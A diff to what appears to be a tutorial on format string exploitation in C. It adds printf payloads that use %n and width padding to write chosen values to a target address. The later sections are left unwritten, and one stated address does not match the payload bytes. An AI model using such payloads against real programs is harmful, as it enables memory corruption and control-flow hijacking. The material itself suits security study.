@@ -4,10 +4,11 @@
 
 ### Table of Content
 
-- [Before Exploit]()
-- [Read the stack]()
-- [OverWrite data]()
-- [Code execution redirect]()
+- [Before Exploit](#before-exploit)
+- [Read the stack](#read-the-stack)
+- [OverWrite data](#overwrite-data)
+- [write complex value](#write-complex-value)
+- [Code execution redirect](#code-execution-redirect)
 - [Documentation](#docum)
 
 ## Before exploit
@@ -78,7 +79,29 @@ AAAA00000200.f7e26620.00000000.41414141.78383025.3830252e.30252e78.252e7838.2e78
 
 By printing the stack, we can see that the pointer to the buffer is a the 4th address in the stack. so if we write in the buffer an address, and point to it with $x we can overwrite data int it with $n.
 
+```c
+char *overwrite = "\x8c\x98\x04\x08%4$n";
+printf(overwrite);
+```
 
+So this overwrite 4 at the address 0x08049888c.
+
+If you want to print a special value inside the pointer, you can give it a padding using this ```%<size>x```
+
+```c
+char *overwrite = "\x8c\x98\x04\x08%60x%4$n";
+printf(overwrite);
+```
+
+This will print 60 byte + 4 (address) into pointer.
+
+## Write complex value
+
+*section need to be write*
+
+## Code execution redirect
+
+*section need to be write*
  
 ### Docum
 
